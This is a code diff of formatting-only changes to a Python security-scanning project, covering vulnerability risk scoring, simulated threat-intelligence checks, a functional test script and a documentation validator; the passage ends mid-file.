prerequisite_patterns:\n-            if (any(p in vuln1.template_id.lower() for p in prereq) and \n-                any(e in vuln2.template_id.lower() for e in enabled)):\n+            if any(p in vuln1.template_id.lower() for p in prereq) and any(\n+                e in vuln2.template_id.lower() for e in enabled\n+            ):\n                 return \"ENABLES\"\n-        \n+\n         # Amplification (one makes the other worse)\n-        if (vuln1.target == vuln2.target and \n-            vuln1.attack_vector == vuln2.attack_vector):\n+        if vuln1.target == vuln2.target and vuln1.attack_vector == vuln2.attack_vector:\n             return \"AMPLIFIES\"\n-        \n+\n         return None\n-    \n-    def _calculate_relationship_weight(self, vuln1: VulnerabilityContext, vuln2: VulnerabilityContext, relationship: str) -> float:\n+\n+    def _calculate_relationship_weight(\n+        self,\n+        vuln1: VulnerabilityContext,\n+        vuln2: VulnerabilityContext,\n+        relationship: str,\n+    ) -> float:\n         \"\"\"Calculate weight of relationship between vulnerabilities\"\"\"\n         if relationship == \"ENABLES\":\n             return vuln2.business_impact * vuln1.exploitability\n         elif relationship == \"AMPLIFIES\":\n             return (vuln1.business_impact + vuln2.business_impact) * 0.5\n-        \n+\n         return 1.0\n-    \n-    def _find_critical_paths(self, vulnerabilities: List[VulnerabilityContext]) -> List[Dict[str, Any]]:\n+\n+    def _find_critical_paths(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[Dict[str, Any]]:\n         \"\"\"Find critical attack paths through the vulnerability graph\"\"\"\n         paths = []\n-        \n+\n         # Group by target\n         target_groups = defaultdict(list)\n         for vuln in vulnerabilities:\n             target_groups[vuln.target].append(vuln)\n-        \n+\n         for target, vulns in target_groups.items():\n             # Sort by attack chain position\n             sorted_vulns = sorted(vulns, key=lambda v: v.attack_chain_position)\n-            \n+\n             if len(sorted_vulns) >= 2:\n-                path_risk = sum(v.business_impact * v.exploitability for v in sorted_vulns[:3])  # Top 3\n-                paths.append({\n-                    \"target\": target,\n-                    \"path\": [v.template_id for v in sorted_vulns[:3]],\n-                    \"path_risk\": path_risk,\n-                    \"estimated_time\": self._estimate_path_time(sorted_vulns[:3])\n-                })\n-        \n+                path_risk = sum(\n+                    v.business_impact * v.exploitability for v in sorted_vulns[:3]\n+                )  # Top 3\n+                paths.append(\n+                    {\n+                        \"target\": target,\n+                        \"path\": [v.template_id for v in sorted_vulns[:3]],\n+                        \"path_risk\": path_risk,\n+                        \"estimated_time\": self._estimate_path_time(sorted_vulns[:3]),\n+                    }\n+                )\n+\n         return sorted(paths, key=lambda p: p[\"path_risk\"], reverse=True)[:5]\n-    \n+\n     def _estimate_path_time(self, vulnerabilities: List[VulnerabilityContext]) -> str:\n         \"\"\"Estimate time to complete attack path\"\"\"\n         total_complexity = sum(v.remediation_complexity for v in vulnerabilities)\n-        avg_exploitability = statistics.mean([v.exploitability for v in vulnerabilities])\n-        \n+        avg_exploitability = statistics.mean(\n+            [v.exploitability for v in vulnerabilities]\n+        )\n+\n         if avg_exploitability > 0.8 and total_complexity <= 6:\n             return \"Hours\"\n         elif avg_exploitability > 0.6 and total_complexity <= 10:\n             return \"Days\"\n         else:\n             return \"Weeks\"\n-    \n-    def _calculate_risk_amplification(self, vulnerabilities: List[VulnerabilityContext]) -> float:\n+\n+    def _calculate_risk_amplification(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> float:\n         \"\"\"Calculate overall risk amplification factor\"\"\"\n         if len(vulnerabilities) <= 1:\n             return 1.0\n-        \n+\n         # Base amplification from vulnerability count\n         count_factor = 1.0 + (len(vulnerabilities) - 1) * 0.1\n-        \n+\n         # Amplification from attack chains\n         chain_count = len(self._find_attack_chains(vulnerabilities))\n         chain_factor = 1.0 + (chain_count * 0.2)\n-        \n+\n         # Amplification from clusters\n         cluster_count = len(self._cluster_vulnerabilities(vulnerabilities))\n         cluster_factor = 1.0 + (cluster_count * 0.15)\n-        \n+\n         total_amplification = count_factor * chain_factor * cluster_factor\n-        \n+\n         return min(total_amplification, 3.0)  # Cap at 3x amplification\n \n \n class ThreatIntelligenceAggregator:\n     \"\"\"Aggregate and correlate threat intelligence data\"\"\"\n-    \n+\n     def __init__(self, config: Dict[str, Any]):\n         self.config = config\n         self.logger = logging.getLogger(__name__)\n         self.intelligence_cache = {}\n         self.threat_feeds = self._initialize_threat_feeds()\n-    \n+\n     def _initialize_threat_feeds(self) -> Dict[str, Dict[str, Any]]:\n         \"\"\"Initialize threat intelligence feeds configuration\"\"\"\n         return {\n             \"abuse_ch\": {\n                 \"url_patterns\": [\"malware-bazaar\", \"threatfox\", \"urlhaus\"],\n-                \"confidence_weight\": 0.9\n+                \"confidence_weight\": 0.9,\n             },\n             \"virustotal\": {\n                 \"api_endpoint\": \"virustotal.com/api/v3\",\n-                \"confidence_weight\": 0.8\n+                \"confidence_weight\": 0.8,\n             },\n-            \"shodan\": {\n-                \"api_endpoint\": \"api.shodan.io\",\n-                \"confidence_weight\": 0.7\n-            },\n-            \"otx\": {\n-                \"api_endpoint\": \"otx.alienvault.com\",\n-                \"confidence_weight\": 0.6\n-            }\n-        }\n-    \n-    def aggregate_threat_intelligence(self, vulnerabilities: List[VulnerabilityContext], targets: List[str]) -> ThreatIntelligence:\n+            \"shodan\": {\"api_endpoint\": \"api.shodan.io\", \"confidence_weight\": 0.7},\n+            \"otx\": {\"api_endpoint\": \"otx.alienvault.com\", \"confidence_weight\": 0.6},\n+        }\n+\n+    def aggregate_threat_intelligence(\n+        self, vulnerabilities: List[VulnerabilityContext], targets: List[str]\n+    ) -> ThreatIntelligence:\n         \"\"\"Aggregate threat intelligence for vulnerabilities and targets\"\"\"\n         # Initialize intelligence structure\n         intelligence = ThreatIntelligence(\n             reputation_score=100.0,\n             known_malicious_ips=[],\n             suspicious_domains=[],\n             threat_feeds={},\n             geolocation_risks={},\n             dark_web_mentions=0,\n-            recent_campaigns=[]\n+            recent_campaigns=[],\n         )\n-        \n+\n         # Analyze each target\n         for target in targets:\n             target_intel = self._analyze_target_intelligence(target)\n             self._merge_intelligence(intelligence, target_intel)\n-        \n+\n         # Analyze vulnerability patterns\n         vuln_intel = self._analyze_vulnerability_intelligence(vulnerabilities)\n         self._merge_intelligence(intelligence, vuln_intel)\n-        \n+\n         # Calculate overall reputation score\n         intelligence.reputation_score = self._calculate_reputation_score(intelligence)\n-        \n+\n         return intelligence\n-    \n+\n     def _analyze_target_intelligence(self, target: str) -> Dict[str, Any]:\n         \"\"\"Analyze threat intelligence for a specific target\"\"\"\n         intel = {\n             \"reputation_score\": 100.0,\n             \"malicious_indicators\": [],\n             \"suspicious_indicators\": [],\n             \"geolocation_risk\": 0.0,\n-            \"threat_feed_matches\": {}\n-        }\n-        \n+            \"threat_feed_matches\": {},\n+        }\n+\n         try:\n             # Extract domain/IP from target\n             from urllib.parse import urlparse\n-            parsed = urlparse(target if target.startswith('http') else f\"http://{target}\")\n+\n+            parsed = urlparse(\n+                target if target.startswith(\"http\") else f\"http://{target}\"\n+            )\n             domain = parsed.netloc or target\n-            \n+\n             # Check cached intelligence\n             cache_key = f\"target_{domain}\"\n             if cache_key in self.intelligence_cache:\n                 cached_time = self.intelligence_cache[cache_key].get(\"timestamp\", 0)\n                 if datetime.now().timestamp() - cached_time < 3600:  # 1 hour cache\n                     return self.intelligence_cache[cache_key][\"data\"]\n-            \n+\n             # Simulate threat intelligence checks (in production, call real APIs)\n             intel = self._simulate_threat_intelligence_lookup(domain)\n-            \n+\n             # Cache the result\n             self.intelligence_cache[cache_key] = {\n                 \"data\": intel,\n-                \"timestamp\": datetime.now().timestamp()\n+                \"timestamp\": datetime.now().timestamp(),\n             }\n-            \n+\n         except Exception as e:\n-            self.logger.warning(f\"Failed to analyze threat intelligence for {target}: {e}\")\n-        \n+            self.logger.warning(\n+                f\"Failed to analyze threat intelligence for {target}: {e}\"\n+            )\n+\n         return intel\n-    \n+\n     def _simulate_threat_intelligence_lookup(self, domain: str) -> Dict[str, Any]:\n         \"\"\"Simulate threat intelligence lookup (replace with real API calls)\"\"\"\n         intel = {\n             \"reputation_score\": 100.0,\n             \"malicious_indicators\": [],\n             \"suspicious_indicators\": [],\n             \"geolocation_risk\": 0.0,\n-            \"threat_feed_matches\": {}\n-        }\n-        \n+            \"threat_feed_matches\": {},\n+        }\n+\n         # Simulate some intelligence based on domain characteristics\n         domain_lower = domain.lower()\n-        \n+\n         # Check for suspicious patterns\n         suspicious_patterns = [\n-            \"bit.ly\", \"tinyurl\", \"temp\", \"test\", \"dev\", \"staging\",\n-            \"admin\", \"login\", \"secure\", \"bank\", \"paypal\"\n+            \"bit.ly\",\n+            \"tinyurl\",\n+            \"temp\",\n+            \"test\",\n+            \"dev\",\n+            \"staging\",\n+            \"admin\",\n+            \"login\",\n+            \"secure\",\n+            \"bank\",\n+            \"paypal\",\n         ]\n-        \n+\n         for pattern in suspicious_patterns:\n             if pattern in domain_lower:\n-                intel[\"suspicious_indicators\"].append(f\"Contains suspicious pattern: {pattern}\")\n+                intel[\"suspicious_indicators\"].append(\n+                    f\"Contains suspicious pattern: {pattern}\"\n+                )\n                 intel[\"reputation_score\"] -= 5.0\n-        \n+\n         # Simulate geolocation risk\n         high_risk_tlds = [\".ru\", \".cn\", \".tk\", \".ml\", \".ga\"]\n         for tld in high_risk_tlds:\n             if domain_lower.endswith(tld):\n                 intel[\"geolocation_risk\"] = 7.0\n                 intel[\"reputation_score\"] -= 10.0\n                 break\n-        \n+\n         # Simulate threat feed matches\n-        if len(domain) > 20 or any(char.isdigit() for char in domain.replace('.', '')):\n+        if len(domain) > 20 or any(char.isdigit() for char in domain.replace(\".\", \"\")):\n             intel[\"threat_feed_matches\"][\"suspicious_domain_patterns\"] = True\n             intel[\"reputation_score\"] -= 3.0\n-        \n+\n         return intel\n-    \n-    def _analyze_vulnerability_intelligence(self, vulnerabilities: List[VulnerabilityContext]) -> Dict[str, Any]:\n+\n+    def _analyze_vulnerability_intelligence(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> Dict[str, Any]:\n         \"\"\"Analyze threat intelligence based on vulnerability patterns\"\"\"\n         intel = {\n             \"reputation_score\": 0.0,\n             \"malicious_indicators\": [],\n             \"suspicious_indicators\": [],\n             \"campaign_matches\": [],\n-            \"exploit_intelligence\": {}\n-        }\n-        \n+            \"exploit_intelligence\": {},\n+        }\n+\n         # Analyze vulnerability patterns for known campaigns\n         vuln_templates = [v.template_id for v in vulnerabilities]\n-        \n+\n         # Check for known campaign patterns\n         campaign_patterns = {\n             \"mass_scanning_campaign\": [\"nuclei\", \"scanner\", \"automated\"],\n             \"targeted_attack\": [\"custom\", \"specific\", \"manual\"],\n-            \"opportunistic_attack\": [\"common\", \"widespread\", \"default\"]\n-        }\n-        \n+            \"opportunistic_attack\": [\"common\", \"widespread\", \"default\"],\n+        }\n+\n         for campaign, patterns in campaign_patterns.items():\n-            matches = sum(1 for template in vuln_templates \n-                         for pattern in patterns \n-                         if pattern in template.lower())\n-            \n+            matches = sum(\n+                1\n+                for template in vuln_templates\n+                for pattern in patterns\n+                if pattern in template.lower()\n+            )\n+\n             if matches > 0:\n-                intel[\"campaign_matches\"].append({\n-                    \"campaign_type\": campaign,\n-                    \"confidence\": min(matches / len(vuln_templates), 1.0),\n-                    \"matched_vulnerabilities\": matches\n-                })\n-        \n+                intel[\"campaign_matches\"].append(\n+                    {\n+                        \"campaign_type\": campaign,\n+                        \"confidence\": min(matches / len(vuln_templates), 1.0),\n+                        \"matched_vulnerabilities\": matches,\n+                    }\n+                )\n+\n         # Analyze exploit availability\n-        high_exploitability_vulns = [v for v in vulnerabilities if v.exploitability > 0.7]\n+        high_exploitability_vulns = [\n+            v for v in vulnerabilities if v.exploitability > 0.7\n+        ]\n         if high_exploitability_vulns:\n-            intel[\"exploit_intelligence\"][\"high_risk_count\"] = len(high_exploitability_vulns)\n-            intel[\"exploit_intelligence\"][\"public_exploits\"] = sum(1 for v in high_exploitability_vulns if v.public_exploit_available)\n-        \n+            intel[\"exploit_intelligence\"][\"high_risk_count\"] = len(\n+                high_exploitability_vulns\n+            )\n+            intel[\"exploit_intelligence\"][\"public_exploits\"] = sum(\n+                1 for v in high_exploitability_vulns if v.public_exploit_available\n+            )\n+\n         return intel\n-    \n-    def _merge_intelligence(self, target_intel: ThreatIntelligence, source_intel: Dict[str, Any]):\n+\n+    def _merge_intelligence(\n+        self, target_intel: ThreatIntelligence, source_intel: Dict[str, Any]\n+    ):\n         \"\"\"Merge intelligence from different sources\"\"\"\n         # Merge malicious indicators\n         if \"malicious_indicators\" in source_intel:\n-            target_intel.known_malicious_ips.extend(source_intel[\"malicious_indicators\"])\n-        \n+            target_intel.known_malicious_ips.extend(\n+                source_intel[\"malicious_indicators\"]\n+            )\n+\n         # Merge suspicious indicators\n         if \"suspicious_indicators\" in source_intel:\n-            target_intel.suspicious_domains.extend(source_intel[\"suspicious_indicators\"])\n-        \n+            target_intel.suspicious_domains.extend(\n+                source_intel[\"suspicious_indicators\"]\n+            )\n+\n         # Merge threat feed data\n         if \"threat_feed_matches\" in source_intel:\n             target_intel.threat_feeds.update(source_intel[\"threat_feed_matches\"])\n-        \n+\n         # Merge geolocation risks\n         if \"geolocation_risk\" in source_intel:\n             risk_score = source_intel[\"geolocation_risk\"]\n             if risk_score > 0:\n                 target_intel.geolocation_risks[\"unknown_source\"] = risk_score\n-        \n+\n         # Merge campaign matches\n         if \"campaign_matches\" in source_intel:\n             target_intel.recent_campaigns.extend(source_intel[\"campaign_matches\"])\n-    \n+\n     def _calculate_reputation_score(self, intelligence: ThreatIntelligence) -> float:\n         \"\"\"Calculate overall reputation score\"\"\"\n         base_score = 100.0\n-        \n+\n         # Deduct for malicious indicators\n         base_score -= len(intelligence.known_malicious_ips) * 10.0\n-        \n+\n         # Deduct for suspicious indicators\n         base_score -= len(intelligence.suspicious_domains) * 3.0\n-        \n+\n         # Deduct for geolocation risks\n         base_score -= sum(intelligence.geolocation_risks.values()) * 2.0\n-        \n+\n         # Deduct for threat feed matches\n         base_score -= len(intelligence.threat_feeds) * 5.0\n-        \n+\n         # Deduct for recent campaigns\n         base_score -= len(intelligence.recent_campaigns) * 7.0\n-        \n-        return max(0.0, min(100.0, base_score))\n\\ No newline at end of file\n+\n+        return max(0.0, min(100.0, base_score))\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/quick_functional_test.py\t2025-09-14 19:10:58.579755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/quick_functional_test.py\t2025-09-14 19:23:13.095961+00:00\n@@ -5,160 +5,178 @@\n \"\"\"\n \n import sys\n from pathlib import Path\n \n+\n def test_config_validator():\n     \"\"\"Test config validator functionality\"\"\"\n     print(\"\ud83d\udd27 Testing Config Validator...\")\n-    \n+\n     try:\n         from config_validator import ConfigValidator\n-        \n+\n         validator = ConfigValidator()\n-        \n+\n         # Test default config\n         default_config = validator.get_default_config()\n         result = validator.validate_config(default_config)\n-        \n-        print(f\"   Default config validation: {'\u2705 PASS' if result['valid'] else '\u274c FAIL'}\")\n-        \n+\n+        print(\n+            f\"   Default config validation: {'\u2705 PASS' if result['valid'] else '\u274c FAIL'}\"\n+        )\n+\n         # Test invalid config\n         invalid_config = {\n-            'limits': {\n-                'parallel_jobs': -5,  # Invalid: negative\n-                'http_timeout': 500   # Invalid: too high\n+            \"limits\": {\n+                \"parallel_jobs\": -5,  # Invalid: negative\n+                \"http_timeout\": 500,  # Invalid: too high\n             }\n         }\n         result = validator.validate_config(invalid_config)\n-        print(f\"   Invalid config detection: {'\u2705 PASS' if not result['valid'] else '\u274c FAIL'}\")\n-        \n+        print(\n+            f\"   Invalid config detection: {'\u2705 PASS' if not result['valid'] else '\u274c FAIL'}\"\n+        )\n+\n         # Test actual config file\n         config_file = Path(\"p4nth30n.cfg.json\")\n         if config_file.exists():\n             result = validator.validate_file(config_file)\n-            print(f\"   Actual config file validation: {'\u2705 PASS' if result['valid'] else '\u274c FAIL'}\")\n-        \n+            print(\n+                f\"   Actual config file validation: {'\u2705 PASS' if result['valid'] else '\u274c FAIL'}\"\n+            )\n+\n         return True\n-        \n+\n     except Exception as e:\n         print(f\"   \u274c Config validator test failed: {e}\")\n         return False\n \n+\n def test_enhanced_scanner():\n     \"\"\"Test enhanced scanner module\"\"\"\n     print(\"\ud83d\udd0d Testing Enhanced Scanner...\")\n-    \n+\n     try:\n-        from enhanced_scanner import AdaptiveScanManager, EnhancedScanner, get_current_success_rate\n-        \n+        from enhanced_scanner import (\n+            AdaptiveScanManager,\n+            EnhancedScanner,\n+            get_current_success_rate,\n+        )\n+\n         # Test imports work\n         print(\"   \u2705 Module imports successful\")\n-        \n+\n         # Test function call\n         success_rate = get_current_success_rate()\n         print(f\"   Current success rate: {success_rate:.1%}\")\n-        \n+\n         # Test class instantiation\n         scan_manager = AdaptiveScanManager()\n         print(\"   \u2705 AdaptiveScanManager instantiated\")\n-        \n+\n         return True\n-        \n+\n     except Exception as e:\n         print(f\"   \u274c Enhanced scanner test failed: {e}\")\n         return False\n \n+\n def test_domain_validation():\n     \"\"\"Test domain validation fixes\"\"\"\n     print(\"\ud83c\udf10 Testing Domain Validation...\")\n-    \n+\n     try:\n         import bl4ckc3ll_p4nth30n as main\n-        \n+\n         test_cases = [\n             (\"google.com\", True, \"Valid domain\"),\n             (\"localhost\", True, \"Single-word domain\"),\n             (\"192.168.1.1\", False, \"IP address\"),\n             (\"invalid..domain\", False, \"Invalid format\"),\n-            (\"\", False, \"Empty string\")\n+            (\"\", False, \"Empty string\"),\n         ]\n-        \n+\n         passed = 0\n         for domain, expected, description in test_cases:\n             result = main.validate_domain_input(domain)\n             status = \"\u2705 PASS\" if result == expected else \"\u274c FAIL\"\n             print(f\"   {description}: {status}\")\n             if result == expected:\n                 passed += 1\n-        \n+\n         print(f\"   Overall: {passed}/{len(test_cases)} cases passed\")\n         return passed == len(test_cases)\n-        \n+\n     except Exception as e:\n         print(f\"   \u274c Domain validation test failed: {e}\")\n         return False\n \n+\n def test_main_imports():\n     \"\"\"Test that all major modules can be imported\"\"\"\n     print(\"\ud83d\udce6 Testing Core Module Imports...\")\n-    \n+\n     modules_to_test = [\n         \"bl4ckc3ll_p4nth30n\",\n-        \"config_validator\", \n+        \"config_validator\",\n         \"enhanced_scanner\",\n         \"enhanced_scanning\",\n         \"enhanced_validation\",\n         \"enhanced_wordlists\",\n         \"error_handler\",\n-        \"security_utils\"\n+        \"security_utils\",\n     ]\n-    \n+\n     passed = 0\n     for module in modules_to_test:\n         try:\n             __import__(module)\n             print(f\"   \u2705 {module}\")\n             passed += 1\n         except ImportError as e:\n             print(f\"   \u274c {module}: {e}\")\n         except Exception as e:\n             print(f\"   \u26a0\ufe0f  {module}: {e}\")\n-    \n+\n     print(f\"   Imports: {passed}/{len(modules_to_test)} successful\")\n     return passed == len(modules_to_test)\n+\n \n def main():\n     \"\"\"Run all tests\"\"\"\n     print(\"\ud83e\uddea Quick Functional Test Suite\")\n     print(\"=\" * 50)\n-    \n+\n     tests = [\n         test_main_imports,\n         test_config_validator,\n         test_enhanced_scanner,\n-        test_domain_validation\n+        test_domain_validation,\n     ]\n-    \n+\n     passed_tests = 0\n     total_tests = len(tests)\n-    \n+\n     for test_func in tests:\n         try:\n             if test_func():\n                 passed_tests += 1\n         except Exception as e:\n             print(f\"   \u274c Test {test_func.__name__} failed with exception: {e}\")\n         print()\n-    \n+\n     print(\"=\" * 50)\n-    print(f\"\ud83d\udcca SUMMARY: {passed_tests}/{total_tests} tests passed ({passed_tests/total_tests*100:.1f}%)\")\n-    \n+    print(\n+        f\"\ud83d\udcca SUMMARY: {passed_tests}/{total_tests} tests passed ({passed_tests/total_tests*100:.1f}%)\"\n+    )\n+\n     if passed_tests == total_tests:\n         print(\"\ud83c\udf89 All functional tests PASSED!\")\n         return 0\n     else:\n         print(\"\u26a0\ufe0f  Some tests failed - review output above\")\n         return 1\n \n+\n if __name__ == \"__main__\":\n-    sys.exit(main())\n\\ No newline at end of file\n+    sys.exit(main())\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/docs_validator.py\t2025-09-14 19:15:30.168821+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/docs_validator.py\t2025-09-14 19:23:13.140451+00:00\n@@ -8,154 +8,178 @@\n import sys\n from pathlib import Path\n from typing import List, Dict\n import json\n \n+\n class DocumentationValidator:\n     def __init__(self):\n         self.issues = []\n-        \n+\n     def validate_markdown(self, file_path: Path) -> List[str]:\n         \"\"\"Validate markdown files\"\"\"\n         issues = []\n         try:\n-            with open(file_path, 'r', encoding='utf-8') as f:\n+            with open(file_path, \"r\", encoding=\"utf-8\") as f:\n                 content = f.read()\n-                \n+\n             # Check for broken links\n-            links = re.findall(r'\\[([^\\]]+)\\]\\(([^)]+)\\)', content)\n+            links = re.findall(r\"\\[([^\\]]+)\\]\\(([^)]+)\\)\", content)\n             for link_text, link_url in links:\n-                if link_url.startswith('http'):\n+                if link_url.startswith(\"http\"):\n                     # External links - just warn if they look suspicious\n-                    if not re.match(r'^https?://', link_url):\n-                        issues.append(f\"WARNING: Suspicious external link in {file_path}: {link_url}\")\n-                elif link_url.startswith('/') or link_url.startswith('./'):\n+                    if not re.match(r\"^https?://\", link_url):\n+                        issues.append(\n+                            f\"WARNING: Suspicious external link in {file_path}: {link_url}\"\n+                        )\n+                elif link_url.startswith(\"/\") or link_url.startswith(\"./\"):\n                     # Internal links - check if file exists\n-                    target_path = Path(link_url.lstrip('./'))\n+                    target_path = Path(link_url.lstrip(\"./\"))\n                     if not target_path.exists():\n-                        issues.append(f\"ERROR: Broken internal link in {file_path}: {link_url}\")\n-                        \n+                        issues.append(\n+                            f\"ERROR: Broken internal link in {file_path}: {link_url}\"\n+                        )\n+\n             # Check for TODO/FIXME comments\n-            todo_pattern = r'(TODO|FIXME|XXX|HACK):'\n+            todo_pattern = r\"(TODO|FIXME|XXX|HACK):\"\n             todos = re.findall(todo_pattern, content, re.IGNORECASE)\n             if todos:\n-                issues.append(f\"INFO: Found {len(todos)} TODO/FIXME items in {file_path}\")\n-                \n+                issues.append(\n+                    f\"INFO: Found {len(todos)} TODO/FIXME items in {file_path}\"\n+                )\n+\n             # Check for proper heading structure\n-            headings = re.findall(r'^(#{1,6})\\s+(.+)$', content, re.MULTILINE)\n+            headings = re.findall(r\"^(#{1,6})\\s+(.+)$\", content, re.MULTILINE)\n             if headings:\n                 heading_levels = [len(h[0]) for h in headings]\n                 for i in range(1, len(heading_levels)):\n-                    if heading_levels[i] > heading_levels[i-1] + 1:\n-                        issues.append(f\"WARNING: Heading level skip in {file_path} (line with '{headings[i][1]}')\")\n-                        \n+                    if heading_levels[i] > heading_levels[i - 1] + 1:\n+                        issues.append(\n+                            f\"WARNING: Heading level skip in {file_path} (line with '{headings[i][1]}')\"\n+                        )\n+\n             # Check for code blocks without language specification\n-            code_blocks = re.findall(r'```(\\w*)\\n', content)\n+            code_blocks = re.findall(r\"```(\\w*)\\n\", content)\n             for block in code_blocks:\n                 if not block:\n-                    issues.append(f\"WARNING: Code block without language specification in {file_path}\")\n-                    \n+                    issues.append(\n+                        f\"WARNING: Code block without language specification in {file_path}\"\n+                    )\n+\n         except Exception as e:\n             issues.append(f\"ERROR: Could not validate {file_path}: {e}\")\n-            \n+\n         return issues\n-        \n+\n     def validate_rst(self, file_path: Path) -> List[str]:\n         \"\"\"Validate reStructuredText files\"\"\"\n         issues = []\n         try:\n-            with open(file_path, 'r', encoding='utf-8') as f:\n+            with open(file_path, \"r\", encoding=\"utf-8\") as f:\n                 content = f.read()\n-                \n+\n             # Check for basic RST syntax issues\n-            if '.. ' in content:\n+            if \".. \" in content:\n                 # Check for common directive issues\n-                directives = re.findall(r'\\.\\. (\\w+)::', content)\n-                known_directives = ['note', 'warning', 'code-block', 'image', 'figure', 'table']\n+                directives = re.findall(r\"\\.\\. (\\w+)::\", content)\n+                known_directives = [\n+                    \"note\",\n+                    \"warning\",\n+                    \"code-block\",\n+                    \"image\",\n+                    \"figure\",\n+                    \"table\",\n+                ]\n                 for directive in directives:\n                     if directive not in known_directives:\n-                        issues.append(f\"WARNING: Unknown RST directive '{directive}' in {file_path}\")\n-                        \n+                        issues.append(\n+                            f\"WARNING: Unknown RST directive '{directive}' in {file_path}\"\n+                        )\n+\n         except Exception as e:\n             issues.append(f\"ERROR: Could not validate {file_path}: {e}\")\n-            \n+\n         return issues\n-        \n+\n     def check_documentation_completeness(self) -> List[str]:\n         \"\"\"Check if documentation is complete\"\"\"\n         issues = []\n-        \n+\n         # Required documentation files\n         required_docs = [\n-            'README.md',\n-            'USAGE_GUIDE.md',\n-            'SECURITY_CHECKLIST.md',\n-            'CHANGELOG.md'\n+            \"README.md\",\n+            \"USAGE_GUIDE.md\",\n+            \"SECURITY_CHECKLIST.md\",\n+            \"CHANGELOG.md\",\n         ]\n-        \n+\n         for doc in required_docs:\n             if not Path(doc).exists():\n                 issues.append(f\"ERROR: Missing required documentation: {doc}\")\n             else:\n                 # Check if file is not empty\n-                with open(doc, 'r', encoding='utf-8') as f:\n+                with open(doc, \"r\", encoding=\"utf-8\") as f:\n                     if len(f.read().strip()) < 100:\n-                        issues.append(f\"WARNING: Documentation file {doc} seems incomplete (too short)\")\n-                        \n+                        issues.append(\n+                            f\"WARNING: Documentation file {doc} seems incomplete (too short)\"\n+                        )\n+\n         return issues\n-        \n+\n     def validate_all(self) -> int:\n         \"\"\"Validate all documentation files\"\"\"\n         print(\"\ud83d\udcda Running Documentation Validation...\")\n-        \n+\n         # Get all documentation files\n-        md_files = list(Path('.').glob('**/*.md'))\n-        rst_files = list(Path('.').glob('**/*.rst'))\n-        \n+        md_files = list(Path(\".\").glob(\"**/*.md\"))\n+        rst_files = list(Path(\".\").glob(\"**/*.rst\"))\n+\n         total_issues = 0\n-        \n+\n         # Validate Markdown files\n         for file_path in md_files:\n-            if '.git' in str(file_path):\n+            if \".git\" in str(file_path):\n                 continue\n             issues = self.validate_markdown(file_path)\n             self.issues.extend(issues)\n             total_issues += len(issues)\n-            \n+\n         # Validate RST files\n         for file_path in rst_files:\n-            if '.git' in str(file_path):\n+            if \".git\" in str(file_path):\n                 continue\n             issues = self.validate_rst(file_path)\n             self.issues.extend(issues)\n             total_issues += len(issues)\n-            \n+\n         # Check completeness\n         completeness_issues = self.check_documentation_completeness()\n         self.issues.extend(completeness_issues)\n         total_issues += len(completeness_issues)\n-        \n+\n         # Report results\n         if total_issues == 0:\n             print(\"\u2705 Documentation validation passed - no issues found!\")\n         else:\n             print(f\"\u26a0\ufe0f  Found {total_issues} documentation issues:\")\n             for issue in self.issues:\n                 print(f\"  - {issue}\")\n-                \n+\n         # Save report\n-        with open('docs-validation-report.json', 'w') as f:\n-            json.dump({\n-                'total_issues': total_issues,\n-                'issues': self.issues,\n-                'files_checked': {\n-                    'markdown': len(md_files),\n-                    'rst': len(rst_files)\n-                }\n-            }, f, indent=2)\n-            \n+        with open(\"docs-validation-report.json\", \"w\") as f:\n+            json.dump(\n+                {\n+                    \"total_issues\": total_issues,\n+                    \"issues\": self.issues,\n+                    \"files_checked\": {\"markdown\": len(md_files), \"rst\": len(rst_files)},\n+                },\n+                f,\n+                indent=2,\n+            )\n+\n         return total_issues\n \n-if __name__ == '__main__':\n+\n+if __name__ == \"__main__\":\n     validator = DocumentationValidator()\n     issues = validator.validate_all()\n-    sys.exit(1 if issues > 0 else 0)\n\\ No newline at end of file\n+    sys.exit(1 if issues > 0 else 0)\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/comprehensive_test_framework.py\t2025-09-14 19:19:07.727871+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/comprehensive_test_framework.py\t2025-09-14 19:23:13.359048+00:00\n@@ -17,78 +17,108 @@\n from typing import Dict, List, Any, Tuple\n import importlib.util\n import traceback\n from io import StringIO\n \n+\n class ComprehensiveTestFramework:\n     def __init__(self):\n         self.coverage_data = {}\n         self.test_results = {}\n         self.debug_info = {}\n         self.coverage_instance = coverage.Coverage()\n-        \n+\n     def discover_all_python_files(self) -> List[Path]:\n         \"\"\"Discover all Python files in the project\"\"\"\n         python_files = []\n-        for file_path in Path('.').rglob('*.py'):\n-            if not any(exclude in str(file_path) for exclude in [\n-                '.git', '__pycache__', '.pytest_cache', 'venv', '.venv',\n-                'test_', 'tests/', '.tox', 'build/', 'dist/'\n-            ]):\n+        for file_path in Path(\".\").rglob(\"*.py\"):\n+            if not any(\n+                exclude in str(file_path)\n+                for exclude in [\n+                    \".git\",\n+                    \"__pycache__\",\n+                    \".pytest_cache\",\n+                    \"venv\",\n+                    \".venv\",\n+                    \"test_\",\n+                    \"tests/\",\n+                    \".tox\",\n+                    \"build/\",\n+                    \"dist/\",\n+                ]\n+            ):\n                 python_files.append(file_path)\n         return python_files\n-        \n+\n     def analyze_file_structure(self, file_path: Path) -> Dict[str, Any]:\n         \"\"\"Analyze the structure of a Python file\"\"\"\n         try:\n-            with open(file_path, 'r', encoding='utf-8') as f:\n+            with open(file_path, \"r\", encoding=\"utf-8\") as f:\n                 source = f.read()\n-                \n+\n             tree = ast.parse(source)\n-            \n+\n             analysis = {\n-                'classes': [],\n-                'functions': [],\n-                'imports': [],\n-                'lines': source.count('\\n') + 1,\n-                'complexity': 0\n+                \"classes\": [],\n+                